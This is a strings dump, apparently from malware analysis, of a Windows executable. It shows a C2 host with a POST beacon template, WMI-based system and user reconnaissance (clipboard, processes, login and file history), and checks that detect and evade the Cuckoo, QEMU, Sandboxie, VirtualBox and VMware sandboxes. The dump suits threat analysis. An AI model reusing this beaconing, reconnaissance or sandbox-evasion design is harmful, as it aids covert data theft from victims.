[Strings]
nth  paddr      vaddr      len size section  type    string
320  0x00005f3f 0x00406b3f 4   5    .text    ascii   ANNI
321  0x00005f44 0x00406b44 6   7    .text    ascii   @\bE-DA
322  0x00005f4b 0x00406b4b 7   8    .text    ascii   @\fEMONf
323  0x0000605b 0x00406c5b 4   5    .text    ascii   D$\fz
324  0x00006063 0x00406c63 4   5    .text    ascii   D$\bj
325  0x0000612b 0x00406d2b 4   5    .text    ascii   XXX\n
326  0x00006132 0x00406d32 4   5    .text    ascii   ANNI
327  0x00006137 0x00406d37 6   7    .text    ascii   @\bE-DA
328  0x0000613e 0x00406d3e 7   8    .text    ascii   @\fEMONf
329  0x00006234 0x00406e34 4   5    .text    ascii   D$\b7
330  0x0000629a 0x00406e9a 4   5    .text    ascii   D$\b7
331  0x00006394 0x00406f94 4   6    .text    utf8    \tD$\b
332  0x000063c0 0x00406fc0 4   6    .text    utf8    \tD$\b
333  0x00006412 0x00407012 4   5    .text    ascii   D$\b\a
334  0x00006478 0x00407078 4   5    .text    ascii   D$\b\t
335  0x00006489 0x00407089 4   5    .text    ascii   $&\aA
336  0x000064a0 0x004070a0 4   5    .text    ascii   D$\b\v
337  0x000064b1 0x004070b1 4   5    .text    ascii   $0\aA
338  0x000064d9 0x004070d9 4   5    .text    ascii   $<\aA
339  0x00006501 0x00407101 4   5    .text    ascii   $B\aA
340  0x00006515 0x00407115 4   5    .text    ascii   D$\b\t
341  0x00006526 0x00407126 4   5    .text    ascii   $G\aA
342  0x0000654b 0x0040714b 4   5    .text    ascii   $Q\aA
343  0x00006718 0x00407318 4   5    .text    ascii   $3\bA
344  0x00006892 0x00407492 4   6    .text    utf8    \tD$\b
345  0x00006900 0x00407500 4   6    .text    utf8    \tD$\b
346  0x00006a10 0x00407610 4   6    .text    utf8    E܉D$ blocks=Basic Latin,Syriac
347  0x00006a43 0x00407643 5   7    .text    utf8    E܉D$\b blocks=Basic Latin,Syriac
348  0x00006b3f 0x0040773f 4   6    .text    utf8    Љ\$\b blocks=Cyrillic,Basic Latin
349  0x00006ce0 0x004078e0 4   6    .text    utf8    \tD$\f
350  0x00006d33 0x00407933 4   5    .text    ascii   D$\b\a
351  0x00006d44 0x00407944 4   5    .text    ascii   $\\tA
352  0x00006d5b 0x0040795b 4   5    .text    ascii   D$\b\a
353  0x00006d6c 0x0040796c 4   5    .text    ascii   $d\tA
354  0x00006d83 0x00407983 4   5    .text    ascii   D$\b\t
355  0x00006d94 0x00407994 4   5    .text    ascii   $l\tA
356  0x00006dab 0x004079ab 4   5    .text    ascii   D$\b\r
357  0x00006dbc 0x004079bc 4   5    .text    ascii   $v\tA
358  0x00006dd3 0x004079d3 4   5    .text    ascii   D$\b\f
359  0x00006dfb 0x004079fb 4   5    .text    ascii   D$\b\v
360  0x00006e23 0x00407a23 4   5    .text    ascii   D$\b\f
361  0x00006e4b 0x00407a4b 4   5    .text    ascii   D$\b\v
362  0x00006e73 0x00407a73 4   5    .text    ascii   D$\b\b
363  0x00006e9b 0x00407a9b 4   5    .text    ascii   D$\b\t
364  0x00006ec0 0x00407ac0 4   5    .text    ascii   D$\b\n
365  0x00006ee5 0x00407ae5 4   5    .text    ascii   D$\b\v
366  0x00006fdc 0x00407bdc 4   5    .text    ascii   D$\b\f
367  0x00007089 0x00407c89 4   6    .text    utf8    Љ\$\b blocks=Cyrillic,Basic Latin
368  0x000075b0 0x004081b0 4   5    .text    ascii   [^_]
369  0x000076a1 0x004082a1 5   6    .text    ascii   |[^_]
370  0x000078ee 0x004084ee 4   5    .text    ascii   $(\vA
371  0x0000799c 0x0040859c 4   6    .text    utf8    )ǋE\f blocks=Basic Latin,Latin Extended-B
372  0x000079c7 0x004085c7 4   6    .text    utf8    )ƋE\f blocks=Basic Latin,Latin Extended-B
373  0x00007a61 0x00408661 4   6    .text    utf8    )ËE\f blocks=Basic Latin,Latin-1 Supplement
374  0x00007a8c 0x0040868c 4   6    .text    utf8    )KE\f
375  0x00007adf 0x004086df 4   5    .text    ascii   [^_]
376  0x00007b0a 0x0040870a 4   5    .text    ascii   E\b)E
377  0x00007bd5 0x004087d5 7   10   .text    utf8    E\vUĉD$\b blocks=Basic Latin,Latin Extended-A
378  0x00007bf6 0x004087f6 7   10   .text    utf8    E؋U܉D$\b blocks=Basic Latin,Arabic,Syriac
379  0x00007e15 0x00408a15 5   7    .text    utf8    EЉD$\f blocks=Basic Latin,Cyrillic
380  0x000082b3 0x00408eb3 4   5    .text    ascii   D$\b\a
381  0x000082f7 0x00408ef7 4   5    .text    ascii   D$\b\b
382  0x0000831f 0x00408f1f 4   5    .text    ascii   D$\b\n
383  0x0000836f 0x00408f6f 4   5    .text    ascii   D$\b\b
384  0x00008397 0x00408f97 4   5    .text    ascii   D$\b\a
385  0x000083bf 0x00408fbf 4   5    .text    ascii   D$\b\b
386  0x000083e7 0x00408fe7 4   5    .text    ascii   D$\b\v
387  0x0000840f 0x0040900f 4   5    .text    ascii   D$\b\a
388  0x00008437 0x00409037 4   5    .text    ascii   D$\b\v
389  0x0000845f 0x0040905f 4   5    .text    ascii   D$\b\v
390  0x00008487 0x00409087 4   5    .text    ascii   D$\b\b
391  0x000084af 0x004090af 4   5    .text    ascii   D$\b\b
392  0x00008527 0x00409127 4   5    .text    ascii   D$\b\t
393  0x0000854f 0x0040914f 4   5    .text    ascii   D$\b\n
394  0x00008577 0x00409177 4   5    .text    ascii   D$\b\a
395  0x000085c7 0x004091c7 4   5    .text    ascii   D$\b\v
396  0x000085ef 0x004091ef 4   5    .text    ascii   D$\b\r
397  0x00008771 0x00409371 4   5    .text    ascii   D$\b"
398  0x000087b3 0x004093b3 4   5    .text    ascii   D$\f\b
399  0x000088a2 0x004094a2 4   5    .text    ascii   Soft
400  0x000088a9 0x004094a9 4   5    .text    ascii   ware
401  0x000088ae 0x004094ae 6   7    .text    ascii   @\b\Ado
402  0x000088b5 0x004094b5 6   7    .text    ascii   @\fbe\A
403  0x000088be 0x004094be 4   5    .text    ascii   crob
404  0x000088c5 0x004094c5 4   5    .text    ascii   at R
405  0x000088cc 0x004094cc 5   6    .text    ascii   eadef
406  0x00008919 0x00409519 4   5    .text    ascii   \AVG
407  0x00008920 0x00409520 4   5    .text    ascii   ener
408  0x00008925 0x00409525 6   7    .text    ascii   @\bal\c
409  0x0000892c 0x0040952c 6   7    .text    ascii   @\fRece
410  0x00008935 0x00409535 4   5    .text    ascii   ntFi
411  0x0000894b 0x0040954b 4   5    .text    ascii   D$\f\b
412  0x00008a63 0x00409663 4   5    .text    ascii   D$\bL
413  0x00008d0d 0x0040990d 4   5    .text    ascii   D$\b\t
414  0x00008d94 0x00409994 4   5    .text    ascii   D$\b\t
415  0x00008dc1 0x004099c1 4   6    .text    utf8    EԉD$ blocks=Basic Latin,Cyrillic Supplement
416  0x00008e01 0x00409a01 4   5    .text    ascii   D$\b\t
417  0x00008e49 0x00409a49 7   10   .text    utf8    EԍU؉T$  blocks=Basic Latin,Cyrillic Supplement,Arabic
418  0x00008ea2 0x00409aa2 4   5    .text    ascii   D$\b\t
419  0x00008f0d 0x00409b0d 6   9    .text    utf8    E؍UЉT$ blocks=Basic Latin,Arabic,Cyrillic
420  0x00008f4d 0x00409b4d 4   5    .text    ascii   D$\b\t
421  0x00008f8e 0x00409b8e 6   9    .text    utf8    EЍUĉT$ blocks=Basic Latin,Cyrillic,Latin Extended-A
422  0x00008f98 0x00409b98 5   7    .text    utf8    UȉT$\f blocks=Basic Latin,Latin Extended-B
423  0x00008fb7 0x00409bb7 4   7    .text    utf8    E܋Eą blocks=Basic Latin,Syriac,Latin Extended-A
424  0x00008ff4 0x00409bf4 4   6    .text    utf8    M̉L$ blocks=Basic Latin,Combining Diacritical Marks
425  0x00009016 0x00409c16 4   7    .text    utf8    E܋Ẽ blocks=Basic Latin,Syriac,Combining Diacritical Marks
426  0x000093d3 0x00409fd3 4   5    .text    ascii   <-u\e
427  0x00009418 0x0040a018 5   6    .text    ascii   ;E\fwp
428  0x00009432 0x0040a032 4   6    .text    utf8    ʉD$\b blocks=IPA Extensions,Basic Latin
429  0x00009454 0x0040a054 5   6    .text    ascii   ;E\fs\v
430  0x00009473 0x0040a073 4   5    .text    ascii   ;E\fs
431  0x000094a2 0x0040a0a2 4   5    .text    ascii   < t"
432  0x0000950a 0x0040a10a 4   7    .text    utf8    \tӉ؉E blocks=Basic Latin,Cyrillic,Arabic
433  0x00009537 0x0040a137 4   7    .text    utf8    \tӉ؉E blocks=Basic Latin,Cyrillic,Arabic
434  0x0000954c 0x0040a14c 4   5    .text    ascii    [^]
435  0x0000957f 0x0040a17f 4   7    .text    utf8    \tӉ؉E blocks=Basic Latin,Cyrillic,Arabic
436  0x000095b3 0x0040a1b3 4   7    .text    utf8    \tӉ؉E blocks=Basic Latin,Cyrillic,Arabic
437  0x000095c8 0x0040a1c8 4   5    .text    ascii    [^]
438  0x00009e2a 0x0040aa2a 4   6    .text    utf8    U܉T$ blocks=Basic Latin,Syriac
439  0x00009e38 0x0040aa38 4   5    .text    ascii   D$\b\n
440  0x0000a360 0x0040af60 4   5    .text    ascii   UWVS
441  0x0000a38c 0x0040af8c 8   10   .text    utf8    ,[^_]ÍD$ blocks=Basic Latin,Latin-1 Supplement
442  0x0000a3f9 0x0040aff9 6   8    .text    utf8    ,[^_]Ð blocks=Basic Latin,Latin-1 Supplement
443  0x0000a4fc 0x0040b0fc 5   6    .text    ascii   D$$t\n
444  0x0000a593 0x0040b193 5   6    .text    ascii   D$Xt)
445  0x0000a599 0x0040b199 4   6    .text    utf8    ʋT$@ blocks=IPA Extensions,Basic Latin
446  0x0000a67a 0x0040b27a 4   5    .text    ascii   D$\b\e
447  0x0000a6d7 0x0040b2d7 4   5    .text    ascii   5 TA
448  0x0000a6e5 0x0040b2e5 4   5    .text    ascii   =$TA
449  0x0000a726 0x0040b326 4   5    .text    ascii   5$TA
450  0x0000a78c 0x0040b38c 4   5    .text    ascii   D$\b@
451  0x0000a7b8 0x0040b3b8 4   5    .text    ascii   0[^_
452  0x0000a854 0x0040b454 4   6    .text    utf8    )čD$ blocks=Basic Latin,Latin Extended-A
453  0x0000a867 0x0040b467 4   5    .text    ascii   -\b$A
454  0x0000a913 0x0040b513 8   10   .text    utf8    [^_]û\b$A blocks=Basic Latin,Latin-1 Supplement
455  0x0000a950 0x0040b550 5   7    .text    utf8    rӡ TA blocks=Basic Latin,Cyrillic
456  0x0000a9a9 0x0040b5a9 5   7    .text    utf8    EȉD$\f blocks=Basic Latin,Latin Extended-B
457  0x0000a9bc 0x0040b5bc 4   6    .text    utf8    E؉D$ blocks=Basic Latin,Arabic
458  0x0000a9d1 0x0040b5d1 4   7    .text    utf8    덻\b$A blocks=Hangul Syllables,Basic Latin
459  0x0000aa8f 0x0040b68f 6   9    .text    utf8    >롋\r$TA blocks=Basic Latin,Hangul Syllables
460  0x0000ac70 0x0040b870 4   5    .text    ascii   UWVS
461  0x0000ac79 0x0040b879 4   5    .text    ascii   $8TA
462  0x0000ac94 0x0040b894 4   5    .text    ascii   =@dA
463  0x0000acc7 0x0040b8c7 4   5    .text    ascii   $8TA
464  0x0000acd8 0x0040b8d8 6   8    .text    utf8    [^_]Ív blocks=Basic Latin,Latin-1 Supplement
465  0x0000ad14 0x0040b914 4   5    .text    ascii   $8TA
466  0x0000ad38 0x0040b938 4   5    .text    ascii   $8TA
467  0x0000ad82 0x0040b982 4   5    .text    ascii   $8TA
468  0x0000adb3 0x0040b9b3 4   5    .text    ascii   $8TA
469  0x0000ade0 0x0040b9e0 4   5    .text    ascii   $8TA
470  0x0000adef 0x0040b9ef 4   7    .text    utf8    щЋR\b blocks=Cyrillic,Basic Latin
471  0x0000ae45 0x0040ba45 5   7    .text    utf8    uޡ0TA blocks=Basic Latin,Thaana
472  0x0000ae77 0x0040ba77 4   5    .text    ascii   $8TA
473  0x0000aeb2 0x0040bab2 4   5    .text    ascii   $8TA
474  0x0000af06 0x0040bb06 4   5    .text    ascii   8MZt
475  0x0000af3b 0x0040bb3b 4   6    .text    utf8    t\e1ɐ blocks=Basic Latin,IPA Extensions
476  0x0000af5a 0x0040bb5a 4   6    .text    utf8    [^Ív blocks=Basic Latin,Latin-1 Supplement
477  0x0000af60 0x0040bb60 5   6    .text    ascii   UWVS1
478  0x0000af77 0x0040bb77 4   5    .text    ascii   \bw\vf
479  0x0000af81 0x0040bb81 4   5    .text    ascii   MZt\v
480  0x0000af8a 0x0040bb8a 5   7    .text    utf8    [^_]Ð blocks=Basic Latin,Latin-1 Supplement
481  0x0000afcb 0x0040bbcb 4   5    .text    ascii   D$\b\b
482  0x0000afe9 0x0040bbe9 4   5    .text    ascii   [^_]
483  0x0000aff8 0x0040bbf8 6   8    .text    utf8    ^_]Ít& blocks=Basic Latin,Latin-1 Supplement
484  0x0000b08e 0x0040bc8e 5   6    .text    ascii   \$\ft\r
485  0x0000b0d1 0x0040bcd1 5   6    .text    ascii   B' t\a
486  0x0000b1ac 0x0040bdac 4   6    .text    utf8    [^_ø blocks=Basic Latin,Latin-1 Supplement
487  0x0000b1cb 0x0040bdcb 4   6    .text    utf8    tډ\$ blocks=Basic Latin,Arabic
488  0x0000b1e9 0x0040bde9 4   7    .text    utf8    u\v뺍v blocks=Basic Latin,Hangul Syllables
489  0x0000b227 0x0040be27 4   6    .text    utf8    [^_Ð blocks=Basic Latin,Latin-1 Supplement
490  0x0000b238 0x0040be38 4   5    .text    ascii   L$\fr
491  0x0000b260 0x0040be60 4   5    .text    ascii   UWVS
492  0x0000b2b3 0x0040beb3 5   7    .text    utf8    [^_]Ð blocks=Basic Latin,Latin-1 Supplement
493  0x0000b2e8 0x0040bee8 4   6    .text    utf8    ىD$\f blocks=Arabic,Basic Latin
494  0x0000b2ee 0x0040beee 4   6    .text    utf8    ՋD$\b blocks=Armenian,Basic Latin
495  0x0000b30a 0x0040bf0a 4   5    .text    ascii   d$\f9
496  0x0000b32d 0x0040bf2d 4   5    .text    ascii   [^_]
497  0x0000b33d 0x0040bf3d 5   7    .text    utf8    [^_]É blocks=Basic Latin,Latin-1 Supplement
498  0x0000b351 0x0040bf51 6   8    .text    utf8    [^_]Ív blocks=Basic Latin,Latin-1 Supplement
499  0x0000b366 0x0040bf66 4   5    .text    ascii   ;D$\b
500  0x0000b3ac 0x0040bfac 4   5    .text    ascii   D$\b@
501  0x0000b3e0 0x0040bfe0 4   5    .text    ascii   UWVS
502  0x0000b553 0x0040c153 5   7    .text    utf8    [^_]Ð blocks=Basic Latin,Latin-1 Supplement
503  0x0000b573 0x0040c173 5   7    .text    utf8    [^_]Ð blocks=Basic Latin,Latin-1 Supplement
504  0x0000b657 0x0040c257 4   6    .text    utf8    t/ǃ( blocks=Basic Latin,Latin Extended-B
505  0x0000b7cf 0x0040c3cf 4   5    .text    ascii   |_t-
506  0x0000b82a 0x0040c42a 4   6    .text    utf8    [^Ív blocks=Basic Latin,Latin-1 Supplement
507  0x0000b850 0x0040c450 4   5    .text    ascii   UWVS
508  0x0000b90a 0x0040c50a 5   6    .text    ascii   \[^_]
509  0x0000b914 0x0040c514 6   7    .text    ascii   </t\b<\
510  0x0000baf9 0x0040c6f9 4   5    .text    ascii   %|eA
511  0x0000bb01 0x0040c701 4   5    .text    ascii   %xeA
512  0x0000bb09 0x0040c709 4   5    .text    ascii   %teA
513  0x0000bb11 0x0040c711 4   5    .text    ascii   %peA
514  0x0000bb19 0x0040c719 4   5    .text    ascii   %leA
515  0x0000bb21 0x0040c721 4   5    .text    ascii   %heA
516  0x0000bb29 0x0040c729 4   5    .text    ascii   %deA
517  0x0000bb31 0x0040c731 4   5    .text    ascii   %`eA
518  0x0000bb39 0x0040c739 4   5    .text    ascii   %\eA
519  0x0000bb41 0x0040c741 4   5    .text    ascii   %XeA
520  0x0000bb49 0x0040c749 4   5    .text    ascii   %TeA
521  0x0000bb51 0x0040c751 4   5    .text    ascii   %PeA
522  0x0000bb59 0x0040c759 4   5    .text    ascii   %LeA
523  0x0000bb61 0x0040c761 4   5    .text    ascii   %HeA
524  0x0000bb69 0x0040c769 4   5    .text    ascii   %DeA
525  0x0000bb71 0x0040c771 4   5    .text    ascii   %<eA
526  0x0000bb79 0x0040c779 4   5    .text    ascii   %4eA
527  0x0000bb81 0x0040c781 4   5    .text    ascii   %0eA
528  0x0000bb89 0x0040c789 4   5    .text    ascii   %(eA
529  0x0000bb91 0x0040c791 4   5    .text    ascii   %$eA
530  0x0000bb99 0x0040c799 4   5    .text    ascii   % eA
531  0x0000bbb9 0x0040c7b9 4   5    .text    ascii   %\feA
532  0x0000bbc1 0x0040c7c1 4   5    .text    ascii   %\beA
533  0x0000bc19 0x0040c819 4   5    .text    ascii   %\bdA
534  0x0000c000 0x0040e000 18  19   .rdata   ascii   libgcc_s_dw2-1.dll
535  0x0000c013 0x0040e013 21  22   .rdata   ascii   __register_frame_info
536  0x0000c029 0x0040e029 23  24   .rdata   ascii   __deregister_frame_info
537  0x0000c041 0x0040e041 13  14   .rdata   ascii   libgcj-16.dll
538  0x0000c04f 0x0040e04f 19  20   .rdata   ascii   _Jv_RegisterClasses
539  0x0000c064 0x0040e064 5   6    .rdata   ascii   60002
540  0x0000c06a 0x0040e06a 15  16   .rdata   ascii   /join/media.cgi
541  0x0000c07a 0x0040e07a 26  27   .rdata   ascii   thunder-winbecome.ddns.net
542  0x0000c098 0x0040e098 151 152  .rdata   ascii   POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
543  0x0000c132 0x0040e132 17  18   .rdata   ascii   XXX\nANNIE-DAEMON\n
544  0x0000c146 0x0040e146 17  18   .rdata   ascii   .\Sagittarius.txt
545  0x0000c160 0x0040e160 55  56   .rdata   ascii   <System up time>\nContinuous operation time: %lu msec.\n\n
546  0x0000c198 0x0040e198 25  26   .rdata   ascii   <Sample path & meta data>
547  0x0000c1b3 0x0040e1b3 16  17   .rdata   ascii   <Start up list>\n
548  0x0000c1c4 0x0040e1c4 24  25   .rdata   ascii   <Desktop customization>\n
549  0x0000c1dd 0x0040e1dd 22  23   .rdata   ascii   <File access history>\n
550  0x0000c1f4 0x0040e1f4 20  21   .rdata   ascii   <Path of wallpaper>\n
551  0x0000c209 0x0040e209 16  17   .rdata   ascii   <Adobe history>\n
552  0x0000c21a 0x0040e21a 8   18   .rdata   utf16le DeviceId
553  0x0000c22c 0x0040e22c 21  44   .rdata   utf16le PCI\VEN_80EE&DEV_CAFE
554  0x0000c258 0x0040e258 14  15   .rdata   ascii   .\Scorpius.txt
555  0x0000c268 0x0040e268 9   20   .rdata   utf16le \nDeviceID
556  0x0000c27c 0x0040e27c 4   10   .rdata   utf16le name
557  0x0000c288 0x0040e288 20  42   .rdata   utf16le NumberOfFunctionKeys
558  0x0000c2b2 0x0040e2b2 6   14   .rdata   utf16le Layout
559  0x0000c2c0 0x0040e2c0 12  26   .rdata   utf16le Manufacturer
560  0x0000c2da 0x0040e2da 12  26   .rdata   utf16le HardwareType
561  0x0000c2f4 0x0040e2f4 25  52   .rdata   utf16le CurrentVerticalResolution
562  0x0000c328 0x0040e328 27  56   .rdata   utf16le CurrentHorizontalResolution
563  0x0000c360 0x0040e360 11  24   .rdata   utf16le MonitorType
564  0x0000c378 0x0040e378 12  26   .rdata   utf16le ScreenHeight
565  0x0000c392 0x0040e392 11  24   .rdata   utf16le ScreenWidth
566  0x0000c3ac 0x0040e3ac 19  40   .rdata   utf16le MonitorManufacturer
567  0x0000c3d4 0x0040e3d4 4   10   .rdata   utf16le Name
568  0x0000c3de 0x0040e3de 7   16   .rdata   utf16le Product
569  0x0000c3ee 0x0040e3ee 7   16   .rdata   utf16le Version
570  0x0000c3fe 0x0040e3fe 12  26   .rdata   utf16le SerialNumber
571  0x0000c418 0x0040e418 11  24   .rdata   utf16le ReleaseDate
572  0x0000c430 0x0040e430 17  36   .rdata   utf16le SMBIOSBIOSVersion
573  0x0000c454 0x0040e454 11  24   .rdata   utf16le InstallDate
574  0x0000c46c 0x0040e46c 14  30   .rdata   utf16le RegisteredUser
575  0x0000c48a 0x0040e48a 6   14   .rdata   utf16le Locale
576  0x0000c498 0x0040e498 13  28   .rdata   utf16le TimeGenerated
577  0x0000c4b4 0x0040e4b4 11  12   .rdata   ascii   <keyboard>\n
578  0x0000c4c0 0x0040e4c0 28  58   .rdata   utf16le SELECT * FROM Win32_keyboard
579  0x0000c502 0x0040e502 10  22   .rdata   utf16le ROOT\CIMV2
580  0x0000c518 0x0040e518 8   9    .rdata   ascii   <mouse>\n
581  0x0000c524 0x0040e524 34  70   .rdata   utf16le SELECT * FROM Win32_PointingDevice
582  0x0000c56a 0x0040e56a 13  14   .rdata   ascii   <video card>\n
583  0x0000c578 0x0040e578 35  72   .rdata   utf16le SELECT * FROM Win32_VideoController
584  0x0000c5c0 0x0040e5c0 18  19   .rdata   ascii   <desktop monitor>\n
585  0x0000c5d4 0x0040e5d4 34  70   .rdata   utf16le SELECT * FROM Win32_DesktopMonitor
586  0x0000c61a 0x0040e61a 6   7    .rdata   ascii   <usb>\n
587  0x0000c624 0x0040e624 58  118  .rdata   utf16le SELECT * FROM Win32_PnPEntity WHERE DeviceID like '%USB%' 
588  0x0000c69a 0x0040e69a 15  16   .rdata   ascii   <mother board>\n
589  0x0000c6ac 0x0040e6ac 29  60   .rdata   utf16le SELECT * FROM Win32_BaseBoard
590  0x0000c6e8 0x0040e6e8 7   8    .rdata   ascii   <bios>\n
591  0x0000c6f0 0x0040e6f0 24  50   .rdata   utf16le SELECT * FROM Win32_BIOS
592  0x0000c722 0x0040e722 5   6    .rdata   ascii   <os>\n
593  0x0000c728 0x0040e728 35  72   .rdata   utf16le SELECT * FROM Win32_OperatingSystem
594  0x0000c770 0x0040e770 16  17   .rdata   ascii   <login history>\n
595  0x0000c784 0x0040e784 74  150  .rdata   utf16le SELECT * FROM Win32_NTLogEvent WHERE logfile='system' And EventCode='6005'
596  0x0000c81a 0x0040e81a 16  17   .rdata   ascii   <Login in 2015>\n
597  0x0000c82c 0x0040e82c 118 238  .rdata   utf16le SELECT * FROM Win32_NTLogEvent WHERE logfile='system' AND EventCode='6005' AND TimeGenerated >= '20150101000000.0+540'
598  0x0000c91a 0x0040e91a 29  30   .rdata   ascii   Login amount (in 2015) : %d\n\n
599  0x0000c938 0x0040e938 21  22   .rdata   ascii   <emulator detection>\n
600  0x0000c950 0x0040e950 47  48   .rdata   ascii     [*] Detect by checking for VBox devices  ... 
601  0x0000c980 0x0040e980 10  22   .rdata   utf16le root\cimv2
602  0x0000c996 0x0040e996 6   7    .rdata   ascii   FALSE\n
603  0x0000c9a0 0x0040e9a0 36  74   .rdata   utf16le SELECT DeviceId FROM Win32_PnPEntity
604  0x0000c9ea 0x0040e9ea 5   6    .rdata   ascii   TRUE\n
605  0x0000c9f0 0x0040e9f0 53  54   .rdata   ascii     [*] Detect by looking for VMware serial number ... 
606  0x0000ca28 0x0040ea28 35  72   .rdata   utf16le SELECT SerialNumber FROM Win32_Bios
607  0x0000ca70 0x0040ea70 6   14   .rdata   utf16le VMware
608  0x0000ca7e 0x0040ea7e 14  15   .rdata   ascii   .\Circinus.txt
609  0x0000ca90 0x0040ea90 32  33   .rdata   ascii   <IP, MAC, Default Gateway, DNS>\n
610  0x0000cab1 0x0040eab1 13  14   .rdata   ascii   \n<Port List>\n
611  0x0000cabf 0x0040eabf 12  13   .rdata   ascii   \n<ARP List>\n
612  0x0000cacc 0x0040eacc 14  15   .rdata   ascii   .\Aquarius.txt
613  0x0000cade 0x0040eade 19  20   .rdata   ascii   <Application list>\n
614  0x0000caf2 0x0040eaf2 4   5    .rdata   ascii   .exe
615  0x0000caf7 0x0040eaf7 16  17   .rdata   ascii   C:\Program Files
616  0x0000cb08 0x0040eb08 11  12   .rdata   ascii   .\Orion.txt
617  0x0000cb17 0x0040eb17 17  18   .rdata   ascii   \n<OS product ID>\n
618  0x0000cb29 0x0040eb29 22  23   .rdata   ascii   <System manufacturer>\n
619  0x0000cb40 0x0040eb40 13  14   .rdata   ascii   <OS Version>\n
620  0x0000cb4e 0x0040eb4e 15  16   .rdata   ascii   <# Processors>\n
621  0x0000cb5e 0x0040eb5e 9   10   .rdata   ascii   <Memory>\n
622  0x0000cb68 0x0040eb68 7   8    .rdata   ascii   <Disk>\n
623  0x0000cb70 0x0040eb70 21  22   .rdata   ascii   <# Icons of Desktop>\n
624  0x0000cb86 0x0040eb86 16  17   .rdata   ascii   <System locale>\n
625  0x0000cb97 0x0040eb97 12  13   .rdata   ascii   <Time zone>\n
626  0x0000cba4 0x0040eba4 13  14   .rdata   ascii   <Resolution>\n
627  0x0000cbb2 0x0040ebb2 15  16   .rdata   ascii   <Process list>\n
628  0x0000cbc2 0x0040ebc2 13  14   .rdata   ascii   <Clip board>\n
629  0x0000cbd0 0x0040ebd0 12  13   .rdata   ascii   .\Pisces.txt
630  0x0000cbe0 0x0040ebe0 45  46   .rdata   ascii   Sandbox detected 'TRUE', undetected 'FALSE'\n\n
631  0x0000cc0e 0x0040ec0e 21  22   .rdata   ascii   [-] Cuckoo detection\n
632  0x0000cc24 0x0040ec24 93  94   .rdata   ascii     [*] Detect by cuckoo return address is stored in the TLS (hooks information structure) ... 
633  0x0000cc84 0x0040ec84 142 143  .rdata   ascii        Cuckoo stores the return address in an extra space, allocated in the hook information structure FS: TLS_HOOK_INFO (Thread Local Storage)\n
634  0x0000cd14 0x0040ed14 206 207  .rdata   ascii        Therefor read the address of hook information and calculate the min and max value for the return address value location. Also FireEye use cuckoo https://github.com/David-Reguera-Garcia-Dreg/anticuckoo\n
635  0x0000cde3 0x0040ede3 19  20   .rdata   ascii   [-] Qemu detection\n
636  0x0000cdf8 0x0040edf8 42  43   .rdata   ascii     [*] Reg key Scsi identifier is QEMU ... 
637  0x0000ce23 0x0040ee23 4   5    .rdata   ascii   QEMU
638  0x0000ce28 0x0040ee28 10  11   .rdata   ascii   Identifier
639  0x0000ce34 0x0040ee34 76  77   .rdata   ascii   HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
640  0x0000ce84 0x0040ee84 81  82   .rdata   ascii     [*] Reg key (HKLM\HARDWARE\Description\System "SystemBiosVersion") is QEMU ... 
641  0x0000ced6 0x0040eed6 17  18   .rdata   ascii   SystemBiosVersion
642  0x0000cee8 0x0040eee8 27  28   .rdata   ascii   HARDWARE\Description\System
643  0x0000cf04 0x0040ef04 24  25   .rdata   ascii   [-] Sandboxie detection\n
644  0x0000cf20 0x0040ef20 56  57   .rdata   ascii     [*] Using GetModuleHandle() to search sbiedll.dll ... 
645  0x0000cf59 0x0040ef59 11  12   .rdata   ascii   sbiedll.dll
646  0x0000cf65 0x0040ef65 19  20   .rdata   ascii   [-] VBox detection\n
647  0x0000cf7c 0x0040ef7c 42  43   .rdata   ascii     [*] Reg key Scsi identifier is VBOX ... 
648  0x0000cfa7 0x0040efa7 4   5    .rdata   ascii   VBOX
649  0x0000cfac 0x0040efac 80  81   .rdata   ascii     [*] Reg key (HKLM\HARDWARE\Description\System "SystemBiosVersion") is VBOX... 
650  0x0000d000 0x0040f000 68  69   .rdata   ascii     [*] Reg key (HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions) ... 
651  0x0000d048 0x0040f048 42  43   .rdata   ascii   SOFTWARE\Oracle\VirtualBox Guest Additions
652  0x0000d074 0x0040f074 85  86   .rdata   ascii     [*] Reg key (HKLM\HARDWARE\Description\System "VideoBiosVersion") is VIRTUALBOX... 
653  0x0000d0ca 0x0040f0ca 10  11   .rdata   ascii   VIRTUALBOX
